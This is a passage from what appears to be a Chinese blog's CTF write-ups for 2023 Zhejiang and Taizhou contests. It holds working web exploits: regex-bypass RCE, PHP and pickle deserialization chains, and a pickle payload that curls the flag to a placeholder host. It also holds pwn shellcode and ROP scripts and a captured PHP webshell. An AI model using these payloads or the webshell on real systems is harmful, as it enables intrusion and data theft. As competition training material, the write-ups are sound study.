D%8F%AF%AB%BE%C8%BB%AE%8F%CC%9E%B8%93%8C%A5%AC%BE%90%B5%B8%94%C7%B2%95%BE%88%B4%A7%8C%B1%BC%96%BE%98%B6%BC%BE%94%9C%92%A9%97%A5%BB%CE%92%9C%92%A9%97%A5%BC%98%94%9C%92%98%8C%B2%95%BE%CF%B0%BC%94%C8%BB%AE%90%98%B6%BC%BE%98%A5%A8%B1%90%9D%86%BE%96%B5%B8%94%C9%B5%B7%B5%93%A6%A8%AD%9C%9D%96%B6%C8%BB%AE%90%98%B6%BC%BE%98%B5%B8%C6%88%AF%AC%B5%9C%B5%B7%A5%97%9D%B7%A9%93%AF%AC%B6%8A%9B%B7%B5%8F%9D%AC%97%85%9B%B7%B5%CF%9D%CD%8C%90%B5%B7%B5%93%A6%A8%AE%8C%B6%96%BE%C6%B6%96%94%8F%B3%96%9C%C8%B5%85%8C%B1%BC%96%BE%98%B6%BC%BE%98%B6%BC%BE%B1%BC%96%BE%98%B6%BC%BD%93%9B%92%B9%8C%B4%BC%AD%89%9C%BC%94%C8%BB%AE%90%98%B6%BC%BE%98%A5%91%9B%86%9E%A7%AD%93%B4%BC%AD%CC%9E%BC%87%85%9B%B7%B5%CD%A6%A8%88%90%B5%B7%A5%97%9D%B7%A9%93%B4%AC%CA%AE%AC%B9%BD%99%AD%AA%C6%B2%B4%AB%8C%B1%BC%98%94%94%9E%AC%8C%8D%B0%88%CF%B4%99%AE%CF%B4%DD%DF%83%DF%9D%9E%8C%9A%C9%CB%DF%D2%9B%DF%C1%DF%D0%8B%92%8F%D0%9E%D1%8F%97%8F%D6%DF%D9%D9%DF%8F%97%8F%DF%D0%8B%92%8F%D0%9E%D1%8F%97%8F);\n```\n\n![](/img/wp/2023/2023zhejiang-4.png)\n\n\n## 决赛[baby md5]\n\ncheck.php\n\n```php\n<?php\nerror_reporting(0);\nfunction isRequestFromLocal() {\n    // 定义本地IP地址\n    $localIP = '127.0.0.1';\n\n    // 获取客户端IP地址\n    $clientIP = $_SERVER['HTTP_X_FORWARDED_FOR'];\n\n    // 比较客户端IP地址与本地IP地址\n    if ($clientIP === $localIP) {\n        // 请求来自本地\n        return true;\n    } else {\n        // 请求不来自本地\n        return false;\n    }\n}\n?>\n```\n\nindex.php\n\n```php\n<?php\nerror_reporting(0);\nrequire_once 'check.php';\n\nif (isRequestFromLocal()) {\n    echo 'hello!';\n    $a = $_GET['cmd'];\n    $b = $_GET['key1'];\n    $c = $_GET['key2'];\n    if(!preg_match(\"/eval|shell_exec|system|proc_open|popen|pcntl_exec|\\'|cat|include|whoami/i\",$a)){\n        if(md5($b) == md5($c)){\n            eval($a);\n        }\n    }else{\n        echo 'Oh no, you are hacker!!!';\n    }\n} else {\n    die(\"failed\");\n}\n?>\n```\n\nip验证用X-Forwarded-For，md5弱比较用数组绕过，正则匹配用取反绕过\n\npayload：`X-Forwarded-For=127.0.0.1`,`cmd=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);&key1[]=1&key2[]=2`\n\n![](/img/wp/2023/2023zhejiang-5.png)\n\n\n## 决赛[easy serialize]\n\n```php\n<?php\n//flag is in /flag.php\nerror_reporting(0);\nclass baby{\n    public $var;\n    public $var2;\n    public $var3;\n\n    public function learn($key){\n        echo file_get_contents(__DIR__.$key);\n    }\n\n    public function getAge(){\n        return $this->var2->var3;\n    }\n\n    public function __isset($var){\n        $this->learn($var);\n    }\n\n    public function __invoke(){\n        return $this->learn($this->var);\n    }\n\n    public function __wakeup(){\n        $this->getAge();\n    }\n}\n\nclass young{\n    public $var;\n\n    public function __toString(){\n        return ($this->var)();\n    }\n}\n\nclass old{\n    public $var;\n\n    public function __get($key){\n        return \"Okay, you get the key, but we send you \".$this->var;\n    }\n}\n\n\nif(isset($_GET['age'])){\n    @unserialize($_GET['age']);\n}\nelse{\n    highlight_file(__FILE__);\n}\n?>\n```\n\n给定了flag位置，同时又有`file_get_contents`,那么就从learn函数入手。很明显`__invoke`调用了`learn`，传进去了可控的`$var`，而在`yong::__tostring`中可以触发`baby::__invoke`，`old::__get`中可以触发`yong::__tostring`，baby中的getAge又能触发`old::__get`\n\n\npayload\n\n```php\n<?php\nclass baby{\n    public $var='/flag.php';\n    public $var2;\n    public $var3;\n\n    public function learn($key){\n        echo file_get_contents(__DIR__.$key);\n    }\n\n    public function getAge(){\n        return $this->var2->var3;\n    }\n\n    public function __invoke(){\n        return $this->learn($this->var);\n    }\n\n    public function __wakeup(){\n        $this->getAge();\n    }\n}\n\nclass young{\n    public $var;\n\n    public function __toString(){\n        return ($this->var)();\n    }\n}\n\nclass old{\n    public $var;\n\n    public function __get($key){\n        return \"Okay, you get the key, but we send you \".$this->var;\n    }\n}\n\n$a = new baby();\n$a->var2 = new old();\n$a->var2->var = new young();\n$a->var2->var->var = new baby();\n\necho urlencode(serialize($a));\n```\n\n\n## 决赛[p2rce]\n\n```php\n<?php\nerror_reporting(0);\n\nclass CCC {\n    public $c;\n    public $a;\n    public $b;\n\n    public function __destruct()\n    {\n        $this->a = 'flag';\n        if($this->a === $this->b) {\n            echo $this->c;\n        }\n    }\n}\n\nclass AAA {\n    public $s;\n    public $a;\n\n    public function __toString()\n    {\n        $p = $this->a;\n        return $this->s->$p;\n    }\n}\n\n\nclass BBB {\n    private $b;\n    public function __get($name)\n    {\n        if (is_string($this->b) && !preg_match(\"/[A-Za-z0-9_$]+/\", $this->b)) {\n            global $flag;\n            $flag = $this->b;\n            return 'ok';\n        } else {\n            return '<br/>get it!!';\n        }\n    }\n}\n\n\nif(isset($_GET['ctf'])) {\n    if(preg_match('/flag/i', $_GET['ctf'])) {\n       die('nonono');\n    }\n    $a = unserialize($_GET['ctf']);\n    system($flag);\n    throw new Exception(\"goaway!!!\");\n} else {\n    highlight_file(__FILE__);\n}\n```\n\n从`CCC::__destruct`进入，有个判断，用`&`引用地址，使`$a`永远与`$b`相等，然后echo触发`AAA::__toString`，接着可以通过return对象中不存在的属性来触发`BBB::__get`，最后绕过正则实现rce\n\n最后结尾还有一个`throw new Exception`，破坏字符串结构即可触发fast destruct\n\n```php\n<?php\nclass CCC {\n    public $c;\n    public $a;\n    public $b;\n\n    public function __construct()\n    {\n        $this->b = &$this->a;\n    }\n    public function __destruct()\n    {\n        $this->a = 'flag';\n        if($this->a === $this->b) {\n            echo $this->c;\n        }\n    }\n}\n\nclass AAA {\n    public $s;\n    public $a='lewiserii';\n\n    public function __toString()\n    {\n        $p = $this->a;\n        return $this->s->$p;\n    }\n}\n\n\nclass BBB {\n    public $b='/???/?? /* .';\n    public function __get($name)\n    {\n        if (is_string($this->b) && !preg_match(\"/[A-Za-z0-9_$]+/\", $this->b)) {\n            global $flag;\n            $flag = $this->b;\n            return 'ok';\n        } else {\n            return '<br/>get it!!';\n        }\n    }\n}\n\n\n$a = new CCC();\n$a->c = new AAA();\n$a->c->s = new BBB();\necho urlencode(serialize($a));\n```\n\n`O%3A3%3A%22CCC%22%3A3%3A%7Bs%3A1%3A%22c%22%3BO%3A3%3A%22AAA%22%3A2%3A%7Bs%3A1%3A%22s%22%3BO%3A3%3A%22BBB%22%3A1%3A%7Bs%3A1%3A%22b%22%3Bs%3A12%3A%22%2F%3F%3F%3F%2F%3F%3F+%2F%2A+.%22%3B%7Ds%3A1%3A%22a%22%3Bs%3A9%3A%22lewiserii%22%3B%7Ds%3A1%3A%22a%22%3BN%3Bs%3A1%3A%22b%22%3BR%3A6%3B`\n\n\n通过通配符匹配/bin/cp，将根目录所有文件复制到根目录，然后访问获得flag\n\n或者通过`. /???/????????[@-[]`匹配php的临时文件来rce\n\n```php\nPOST /?ctf=O%3A3%3A%22CCC%22%3A3%3A%7Bs%3A1%3A%22c%22%3BO%3A3%3A%22AAA%22%3A2%3A%7Bs%3A1%3A%22s%22%3BO%3A3%3A%22BBB%22%3A1%3A%7Bs%3A1%3A%22b%22%3Bs%3A20%3A%22.+%2F%3F%3F%3F%2F%3F%3F%3F%3F%3F%3F%3F%3F%5B%40-%5B%5D%22%3B%7Ds%3A1%3A%22a%22%3Bs%3A9%3A%22lewiserii%22%3B%7Ds%3A1%3A%22a%22%3BN%3Bs%3A1%3A%22b%22%3BR%3A6%3B% HTTP/1.1\nHost: 192.168.100.100:10033\nContent-Length: 186\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: null\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary0xXn6nlxZVqh49pS\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\nConnection: close\n\n------WebKitFormBoundary0xXn6nlxZVqh49pS\nContent-Disposition: form-data; name=\"file\"; filename=\"1.txt\"\nContent-Type: text/plain\n\ncat /f*\n------WebKitFormBoundary0xXn6nlxZVqh49pS--\n\n```\n\n\n## 决赛[babyWeb]\n\npickle反序列化\n\n```python\nimport pickle\nimport base64\n\nclass GetShellWithPython(object):\n   def __reduce__(self):\n       import subprocess\n       return (subprocess.call,\n              (['python',\n                 '-c',\n                 'import os;'\n                 'os.system(\"curl http://x.x.x.x:4444?a=`cat /flag`\");'],))\n\npickleData = pickle.dumps(GetShellWithPython())\n\nprint(base64.b64encode(pickleData))\n```\n\n\n# misc\n\n## 初赛[number game]\n\n查看index.js\n\n```js\nfunction roll() {\n    var _0x38f496 = _0x359f\n      , _0x1afb7a = Math[_0x38f496(0xda)](Math[_0x38f496(0xd5)]() * 0x3e8);\n    document['getElementById']('number')[_0x38f496(0xdc)] = _0x1afb7a[_0x38f496(0xd3)]();\n    if (_0x1afb7a == 0x539) {\n        var _0x14184c = [0x38, 0x6f, 0x1e, 0x24, 0x1, 0x32, 0x51, 0x45, 0x1, 0x3c, 0x24, 0xb, 0x55, 0x38, 0xa, 0x5d, 0x28, 0x12, 0x33, 0xb, 0x5d, 0x20, 0x1e, 0x46, 0x17, 0x3d, 0x10, 0x2a, 0x41, 0x44, 0x49, 0x1a, 0x31, 0x5a]\n          , _0x477866 = '';\n        for (var _0x6698b7 = 0x0; _0x6698b7 < _0x14184c['length']; _0x6698b7++)\n            _0x477866 += String[_0x38f496(0xd9)](_0x14184c[_0x6698b7] ^ _0x6698b7 + 0x5a);\n        alert(_0x477866);\n    }\n}\n```\n\n\n```python\na=[0x38,0x6f,0x1e,0x24,0x1,0x32,0x51,0x45,0x1,0x3c,0x24,0xb,0x55,0x38,0xa,0x5d,0x28,0x12,0x33,0xb,0x5d,0x20,0x1e,0x46,0x17,0x3d,0x10,0x2a,0x41,0x44,0x49,0x1a,0x31,0x5a]\nfor i,v in enumerate(a):\n    a[i]=v^i+0x5a\nprint(bytes(a))\n```\n\n## 初赛[Ez_misc]\n\n文件高位和低位交换位置\n\n```python\nf=open('1.jpg','rb')\nf1=open('2.jpg','wb')\nd=f.read()\nfor i in d:\n    n=(i//16)+((i&0xf)<<4)\n    f1.write(bytes([n]))\n```\n\nsteghide空密码解密得到flag.txt\n\n![](/img/wp/2023/2023zhejiang-6.png)\n\n将`DASH`替换成`-`，`DOT`替换成`.`后解摩斯\n\n![](/img/wp/2023/2023zhejiang-7.png)\n\n\n## 初赛[Steins_Gate]\n\n给了一张很大的图片，由`嘟嘟噜`组成一张图片，观察发现每个字是`16*16`\n\n猜测是把原图像素替换成文字了\n\n在每个字中找一个固定的像素点，然后提取像素还原原图\n\n```python\nfrom PIL import Image\n\nimg = Image.open('Steins_Gate.png')\nwidth,height=img.size\n\nnew_img = Image.new(\"RGB\", (int(width / 16), int(height / 16)))\n\nfor i in range(5,height,16):\n    for j in range(2,width,16):\n        tmp = img.getpixel((j,i))\n        print(tmp)\n        new_img.putpixel((int(j / 16), int(i / 16)), (tmp[0], tmp[1], tmp[2]))\n\nnew_img.show()\nnew_img.save('out.png')\n```\n\n![](/img/wp/2023/2023zhejiang-8.png)\n\n\n使用stegsolve发现0通道有很多base64\n\n![](/img/wp/2023/2023zhejiang-9.png)\n\n\n提取出来后发现每组后还有12个字节的冗余数据\n\n```python\nwith open('out','rb')as f:\n    with open('1.txt','wb') as f1:\n        data=f.read()\n        i=0\n        while i<len(data):\n            f1.write(data[i:i+240]+b\"\\n\")\n            i+=252\n```\n\n去除冗余数据后base64解出一张图片\n\n![](/img/wp/2023/2023zhejiang-10.png)\n\n同时也是多行base64的形式，尝试base64隐写\n\n```python\n# -*- coding: utf-8 -*-\n#base64解码脚本，Python2 运行\n\nb64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\n\nwith open('1.txt', 'rb') as f:\n    bin_str = ''\n    for line in f.readlines():\n        stegb64 = ''.join(line.split())\n        rowb64 =  ''.join(stegb64.decode('base64').encode('base64').split())\n        offset = abs(b64chars.index(stegb64.replace('=','')[-1])-b64chars.index(rowb64.replace('=','')[-1]))\n        equalnum = stegb64.count('=')\n        if equalnum:\n            bin_str += bin(offset)[2:].zfill(equalnum * 2)\n        print ''.join([chr(int(bin_str[i:i + 8], 2)) for i in xrange(0, len(bin_str), 8)])\n```\n\n得到密码`DuDuLu~T0_Ch3@t_THe_w0r1d`\n\noutguess解密得到flag\n\n![](/img/wp/2023/2023zhejiang-11.png)\n\n\n## 决赛[Xcode v5.8]\n\nxxencode->base58\n\n![](/img/wp/2023/2023zhejiang-12.png)\n\n\n\n## 决赛[Ez_Signin]\n\nzip爆破密码，得到`11452`\n\nbase32解密后得到一个文本\n\n```text\nMoveTo 495, 314\nKeyUp \"CapsLock\", 1\nLeftClick 1\nLeftDown 1\nMoveTo 495, 313\nMoveTo 495, 312\nMoveTo 494, 312\nMoveTo 494, 311\nMoveTo 493, 311\nDelay 1\n...\n省略\n...\nMouseWheel 1\nDelay 1\nMouseWheel 1\nMouseWheel 1\nMouseWheel 1\nMouseWheel 1\nMouseWheel 1\nKeyDown \"CapsLock\", 1\n```\n\n根据文本内容进行画图\n\n```python\nfrom PIL import Image\na=Image.new(\"1\",(2000,2000))\nf=open(\"flag.txt\")\nd=f.read().splitlines()\nfor i in d:\n    if 'MoveTo' not in i:\n        continue\n    i=i[6:].split(',')\n    x=int(i[0])\n    y=int(i[1])\n    a.putpixel((x,y),255)\na.save(\"1.png\")\n```\n\n![](/img/wp/2023/2023zhejiang-13.png)\n\n\n# crypto\n\n## 初赛[小小数学家]\n\n计算式子\n\n```python\na=[]\na.append(19+49)\na.append(96-31)\na.append(86-3)\na.append(20+47)\na.append(29+55)\na.append(35+35)\na.append(81+42)\na.append(73-16)\na.append(52+48)\na.append(0+56)\na.append(55-6)\na.append(69-20)\na.append(99-48)\na.append(100-52)\na.append(36+13)\na.append(32+13)\na.append(84-34)\na.append(90-34)\na.append(94-45)\na.append(85+13)\na.append(50-5)\na.append(55-3)\na.append(77+25)\na.append(87-35)\na.append(62+35)\na.append(88-43)\na.append(86-30)\na.append(90+10)\na.append(66-17)\na.append(34+63)\na.append(51-6)\na.append(22+76)\na.append(46+5)\na.append(45+11)\na.append(20+78)\na.append(56+45)\na.append(99//1)\na.append(47+52)\na.append(58+44)\na.append(76-26)\na.append(92-42)\na.append(12+44)\na.append(80-27)\na.append(5*25)\nprint(bytes(a))\n```\n\n\n\n\n## 初赛[An EaSy Cipher]\n\n```text\n[\"Kln/qZwlOsux+b/Gv0WsxkOec5E70dNhvczSLFs+0pkHaovEOBqUApBGBDBUrH08。RUNCIDAgMTI4IHNpeCBudW1iZXJz\",\"Kln/qZwlOsux+b/Gv0WsxkOec5E70dNhvczSLFs+0pkHaovEOBqUApBGBDBUrH08\"]\n```\n\n提示：`ECB 0 128 six numbers`\n\n写脚本爆破\n\n```python\nc=\"Kln/qZwlOsux+b/Gv0WsxkOec5E70dNhvczSLFs+0pkHaovEOBqUApBGBDBUrH08\"\nkey=\"RUNCIDAgMTI4IHNpeCBudW1iZXJz\"\n\n#mcrypt是自定义的模块，包含aes\nfrom mcrypt.boom import *\nfrom mcrypt.base import *\nfrom mcrypt.aes import *\nbase=\"0123456789\"\nf=open(\"data.txt\",'wb')\nfor i in Gendic(base,6,True):\n    a=aes(''.join(i),Pad_type=1)\n    data=a.decrypt(b64().decode(c))\n    try:\n        print(data.decode(\"utf-8\"),i)\n        f.write(data)\n        f.write(b'\\n')\n        f.flush()\n    except:\n        pass\n```\n\n![](/img/wp/2023/2023zhejiang-14.png)\n\n\n# reverse\n\n## 初赛[pyccc]\n\n使用pycdc反编译\n\n```python\n# Source Generated with Decompyle++\n# File: baby.pyc (Python 3.8)\n\na = input('please input your flag:\\n')\ncheck = [\n    102,\n    109,\n    99,\n    100,\n    127,\n    52,\n    114,\n    88,\n    97,\n    122,\n    85,\n    125,\n    105,\n    127,\n    119,\n    80,\n    120,\n    112,\n    98,\n    39,\n    109,\n    52,\n    55,\n    106]\nif len(a) == 24:\n    for i in range(len(a)):\n        if check[i] == ord(a[i]) ^ i:\n            continue\n            print(yes)\n\n        print('nononono')\n    continue\nelse:\n    print('nononono')\n```\n\n```python\ncheck = [\n    102,\n    109,\n    99,\n    100,\n    127,\n    52,\n    114,\n    88,\n    97,\n    122,\n    85,\n    125,\n    105,\n    127,\n    119,\n    80,\n    120,\n    112,\n    98,\n    39,\n    109,\n    52,\n    55,\n    106]\n\nfor i in range(len(check)):\n    print(chr(check[i] ^ i), end=\"\")\n\n```\n\n\n## 初赛[easyapk]\n\n密文是`HPjVMiy4FxSPc1n0eq52t4jaZ7FNr/qvJMjkusqbG6t8IVzztqflA0VQmVZYgiaC`，iv是`0123456789ABCDEF`\n\n![](/img/wp/2023/2023zhejiang-15.png)\n\n密钥中e替换成3\n\n`final String replaceAll = \"reversecarefully\".replaceAll(\"e\", \"3\");`\n\n加密模式是AES\n\n![](/img/wp/2023/2023zhejiang-16.png)\n\n\n![](/img/wp/2023/2023zhejiang-17.png)\n\n\n## 初赛[luare]\n\n\n先导出lua的字节码\n\n![](/img/wp/2023/2023zhejiang-18.png)\n\n\n修补文件头为`1B 4C 7561 52`，其中52是版本号\n\n![](/img/wp/2023/2023zhejiang-19.png)\n\n\n使用unluac反编译\n\n`java -jar unluac.jar out > out.lua`\n\n得到\n\n```lua\nfunction CheckAns(data)\n  if #data ~= 40 then\n    return false\n  end\n  dataOut = Oo00Oo0(data)\n  enc = {\n    109,\n    -73,\n    -72,\n    46,\n    -73,\n    -5,\n    99,\n    -100,\n    46,\n    59,\n    32,\n    -76,\n    109,\n    3,\n    59,\n    20,\n    -61,\n    -56,\n    -119,\n    48,\n    100,\n    118,\n    36,\n    118,\n    82,\n    3,\n    95,\n    106,\n    14,\n    -80,\n    5,\n    -89,\n    89,\n    -85,\n    5,\n    14,\n    46,\n    -73,\n    7,\n    127\n  }\n  i = 1\n  while i <= #dataOut do\n    if dataOut[i] ~= enc[i] then\n      return false\n    end\n    i = i + 1\n  end\n  return true\nend\nprint(\"input: \")\nlocal data = io.read()\nif CheckAns(data) then\n  print(\"true\")\nelse\n  print(\"false\")\nend\n```\n\n分析`Oo00Oo0`函数，简单异或\n\n![](/img/wp/2023/2023zhejiang-20.png)\n\n\n解密脚本\n\n```python\nv7=[0]*32\nv7= [0x60856D1028C8953C,0x964849764CB30359,0x2E7164C479B75FB8,0x80637291A7AC8C38,0x7B8BF3AE4B339EB0,\\\n    0xCFE06FEC52B45B4D,0x5DC67EAAB20C3AD,0x24FCFBD656409F00,0x4AF00D463D0BCA92,0x7DBC8A3B1A11555A,0x3061CE7513A9E76C,\\\n    0x9C54D007276AA614,0x34C20158D8898E5C,0x50A02AC02F3569E8,0xC0E681D39FF8836,0xB66E7F18FEB1E693,\\\n    0x29F5D2E92B315378,0x41D9DBDE84172C0F,0x7A45A899A1F71906,0xE5AA0AAF1BA5233E,0x9A3A82FAF8E1A4EF,\\\n    0xC1D173C7651C8FDF,0x8D9DDD875EA2D7C5,0x66EE9790CD81C9F9,0x370874C63F424FDA,0xB93283E32677CB25,\\\n    0xBA2D4ED544F2D3BD,0xBFE421121E049862,0xA31694FDF486F647,0x430251B27C701FEB,0x5DE26B097ECC1522,0xF157EDD4B5BE9BBB]\ntable=b\"\"\nfor i in v7:\n  table+=i.to_bytes(8,'little')\n\ntable=list(table)\nenc=[109,-73,-72,46,-73,-5,99,-100,46,59,32,-76,109,3,59,20,-61,-56,\\\n     -119,48,100,118,36,118,82,3,95,106,14,-80,5,-89,89,-85,5,14,46,-73,7,127]\nfor i,v in enumerate(enc):\n  enc[i]=v&0xff\n\nflag=[]\nflag.insert(0,table.index(enc[-1]))\nind=len(enc)-2\nwhile ind>=0:\n  flag.insert(0,table.index(enc[ind])^flag[0])\n  ind-=1\nprint(bytes(flag))\n```\n\n\n## 决赛[Ez8or]\n\n加密数据再次异或后得到flag\n\n```python\nfrom pwn import *\nimport time\na=[  168, 172,  54, 106, 196,  10, 154, 220,  18,  72,\n  242,  96, 203, 204,  58,  94, 242,  99, 156, 148,\n  245,  72, 205,  23, 130, 205, 247, 113, 159,  54,\n  180, 136, 175,  95, 221, 100, 133, 150, 247,  94,\n  196,   9, 173, 221, 171,  22, 153,  96, 155, 222,\n  245,  83, 195,  33, 252, 128, 248,  16, 199,  38]\n\np=process(\"./Ez8or\")\np.readuntil('flag')\ngdb.attach(p,'bp $rebase(0x1476)')\n# 修改加密函数的参数为密文地址，函数结束后，查看密文地址处储存的信息\npause()\np.sendline(bytes(a))\np.interactive()\n```\n\n\n# pwn\n\n## 决赛[SafeNote]\n\n伪随机数，先获取密文\n\n```python\nfrom pwn import *\nfrom ctypes import CDLL\n\nlib=CDLL(\"./libc.so.6\")\np=process(\"SafeNote\")\ni=96\nwhile i>0:\n    p=remote(\"10.1.101.234\",9999)\n    t=lib.time(0)\n    p1=process(\"./a.out\")\n    p1.sendline(str(i))\n    p.readuntil(\"N =\")\n    d2=int(p.readline())\n    p.sendlineafter(\"choice:\",'3')\n    p.readuntil(\"password = \")\n    d=int(p.readline().strip().decode(\"utf-8\"))\n    p1.send(str(d))\n    p1.readuntil('n:')\n    d1=int(p1.readline().decode(\"utf-8\").strip())\n    print(\"n(1): \"+str(d2))\n    print(\"n(2): \"+str(d1))\n    print(\"nu: \"+str(i))\n    print(\"time: \"+str(t))\n    if d2!=d1:\n        p.close()\n        p1.close()\n        i-=1\n        continue\n    break\np1.readuntil('data:')\nd=p1.readline()\nprint(d)\np.interactive()\n```\n\nrsa解密得到password，然后将password发送给靶机得到flag\n\n```c\n#include<gmp.h>\n#include<time.h>\n#include<stdio.h>\n#include<stdlib.h>\ngmp_randstate_t gmp_state;\n__mpz_struct p,q,n_,e,p_1,q_1,lambda,d_;\n__mpz_struct secret,msg;\nchar* data,data1;\n\nint main(){\n\tdata=malloc(0x2000);\n\tdata1=malloc(0x2000);\n\t__gmpz_inits(&p,&q,&n_,&e,&p_1,&q_1,&lambda,&d_,&secret,&msg,0);\n\t__gmp_randinit_mt(&gmp_state);\n\tlong long int num=0;\n\tscanf(\"%lld\",&num);\n\t__gmp_randseed_ui(&gmp_state,time(0)+num);\n\t__gmpz_urandomb(&q,&gmp_state,256);\n\t__gmpz_nextprime(&q,&q);\n\t__gmpz_urandomb(&p,&gmp_state,256);\n\t__gmpz_nextprime(&p,&p);\n\t __gmpz_mul(&n_, &p, &q);\n\t  __gmpz_set_ui(&e, 65537LL);\n\t  __gmpz_sub_ui(&p_1, &p, 1LL);\n\t  __gmpz_sub_ui(&q_1, &q, 1LL);\n\t  __gmpz_lcm(&lambda, &p_1, &q_1);\n\t  __gmpz_invert(&d_, &e, &lambda);\n\tprintf(\"n: %s\\n\",__gmpz_get_str(0,0,&n_));\n\tread(0,data,0x100);\n\t__gmpz_set_str(&secret,data,10);\n\t__gmpz_powm(&msg,&secret,&d_,&n_);\n\tprintf(\"data: %s\\n\",__gmpz_get_str(0,0,&msg));\n\n}\n```","tags":["wp","2023竞赛","浙江"],"categories":["wp"]},{"title":"2023台州市第三届网络安全大赛wp","url":"/posts/8779ab40/","content":"\n\n# web\n\n## briefphp\n\n```php\n<!--<a href=\"/?source\">source</a>-->\n<?php if (isset($_GET['source'])) highlight_file(__FILE__)  ?>\n<?php\n    error_reporting(0);\n    include('./shell.php');\n    if (isset($_GET['file'])) {\n\n        $content = file_get_contents($_GET['file']);\n        if (strpos($content, '<!DOCTYPE') === False) {\n            die('failed to read');\n        }\n\n        else {\n            echo $content;\n            die();\n        }\n    }\n    else {\n            die('nothing here');\n    }\n\n?> nothing here\n```\n\n只能读取以`<!DOCTYPE`开头的文件，直接用`php_filter_chain_generator`构造\n\n![](/img/wp/2023/2023taizhou-1.png)\n\n\n读取shell.php\n\n![](/img/wp/2023/2023taizhou-2.png)\n\n然后文件包含转命令执行\n\n![](/img/wp/2023/2023taizhou-3.png)\n\n蚁剑连接拿到flag\n\n\n\n# misc\n\n## 这是神马\n\n流量分析，导出http对象\n\n```php\n<?php\n@error_reporting(0);\nsession_start();\n\t$key=\"144a6b2296333602\";\n\t$_SESSION['k']=$key;\n\tsession_write_close();\n\t$post=file_get_contents(\"php://input\");\n\tif(!extension_loaded('openssl'))\n\t{\n\t\t$t=\"base64_\".\"decode\";\n\t\t$post=$t($post.\"\");\n\t\tfor($i=0;$i<strlen($post);$i++) {\n    \t\t\t $post[$i] = $post[$i]^$key[$i+1&15];\n    \t\t\t}\n\t}\n\telse\n\t{\n\t\t$post=openssl_decrypt($post, \"AES128\", $key);\n\t}\n    $arr=explode('|',$post);\n    $func=$arr[0];\n    $params=$arr[1];\n\tclass C{public function __invoke($p) {eval($p.\"\");}}\n    @call_user_func(new C(),$params);\n?>\n```\n\n拿到key后解密冰蝎流量\n\n其中一条流量中发现命令`cd /var/www/html/upload/../;tar -czvf - flag | openssl des3 -salt -k th1sisKey -out ./flag.tar.gz`\n\n![](/img/wp/2023/2023taizhou-4.png)\n\n生成`openssl des3 -salt -k th1sisKey -in ./flag.tar.gz -d -out out.tar.gz`\n\n![](/img/wp/2023/2023taizhou-5.png)\n\n解压得到\n`🙃💵🌿🎤🚪🌏🐎🥋🚫😆✅✉🚰🚹🎤💧📂👑🚫ℹ🍴😎ℹ🚨📮🛩🥋🥋🔪☀🌉😡👑😂🌊⌨🚪🚹😎🎈💧🕹💧🏎☃ℹ☃🔪🍌✅😇🍍⌨🌿💧🌊🎅☂⏩🌊🍵📮☀💵⌨☂📮😇☂🐍😆☀🚪🚹🍵💧🌏🚫😆🐘🐅😀🚰🐍🙃💧🗒🗒\n`\n\n使用`th1sisKey`密钥解emoji-aes得到flag\n\n\n## 李先生的计算机\n\n`2.ad1`文件，使用FTK Imager挂载\n\n根据提示直接找邮件存储位置`MailMasterData`\n\n![](/img/wp/2023/2023taizhou-6.png)\n\n拿到search.db文件，用db browser查看\n\n得到转账金额`600`和附件密码`dbt_1126_tta`\n\n![](/img/wp/2023/2023taizhou-7.png)\n\njpg加密软件密码`123654`\n\n![](/img/wp/2023/2023taizhou-8.png)\n\n附件可以在`MailMasterData`下或`download`目录下找到\n\n![](/img/wp/2023/2023taizhou-9.png)\n\n\n解压后得到`BorromeanIslands.jpg`，jphs解密后得到银行卡号`6222025567723373838`\n\n`DASCTF{600_6222025567723373838}`\n\n\n## Black Mamba\n\niend后有冗余数据，提取出来后异或24\n\n```python\nf=open('1','rb')\nd=f.read()\nf=open(\"output.zip\",'wb')\nfor i in d:\n    f.write(bytes([i^24]))\nf.close()\n```\n\n异或后是压缩包，hint是`说了很多次不要用这么常见的密码了`\n\n掏出祖传的字典爆破，得到`1qaz@WSX`\n\n![](/img/wp/2023/2023taizhou-10.png)\n\n\n解压后是\n\n```\nEAOJYU?TRX>{XPFABY{8{24+\n有人好像对我键盘做了点手脚，看起来像坏了一样。\n```\n\nDvorak解码得到`DASCTF{KOBE_BRYANT_8_24}`\n\n\n\n# reverse\n\n## rrrrs\n\n```python\n\ndef decode(a):\n    a^=a>>18\n    a^=(a<<15)&0xefc60000\n    for i in range(4):\n        a^=((a&(127<<(7*i)))<<7)&(0x9d2c5680)\n    for i in range(3):\n        a^=(a&(4292870144>>(11*i)))>>11\n    return a.to_bytes(4,'big')\n\nc=[\n0xa7a1e601,\n0x10a6a5df,\n0xa3f03b11,\n0x7e523d64,\n0xcb99d7a8,\n0x2ddc2485,\n0xe3c8b3cd,\n0x6b82a51e,\n0x0ea07814,\n0x6bf2bf07]\nflag=b\"\"\nfor i in c:\n    flag+=decode(i)\nprint(flag)\n```\n\n\n# pwn\n\n## babyshell\n\n```python\nfrom pwn import *\ncontext.arch='amd64'\np=remote(\"tcp.cloud.dasctf.com\",\"21844\")\n#p=process('babyshell')\n#gdb.attach(p,\"bp $rebase(0x1366)\")\n#pause()\nshellcode=shellcraft.openat(-100,\"flag\")\nshellcode+=shellcraft.brk()\nshellcode+=\"\"\"\nmov rsi,rax\nsub rsi,0x1000\nmov rdi,3\nmov rdx,0x100\nmov rax,0\nsyscall\nmov rdi,1\nmov rax,1\nsyscall\n\"\"\"\np.send(asm(shellcode))\n\np.interactive()\n```\n\n## mercedes\n\n```python\nfrom pwn import *\np=remote('tcp.cloud.dasctf.com','28629')\ne=ELF(\"mercedes\")\ncontext.binary=e\nsystem=e.plt['system']\ncomm=0x601090\nrdi=0x0000000000400983\nret=0x00000000004005ae\np.sendafter('drink','tac flag 1>&2')\np.sendafter('you?',b'a'*0x28+p64(rdi)+p64(comm)+p64(ret)+p64(system))\n\np.interactive()\n```","tags":["wp","台州","2023竞赛"],"categories":["wp"]},{"title":"2023羊城杯决赛web&pwn Break&Fix 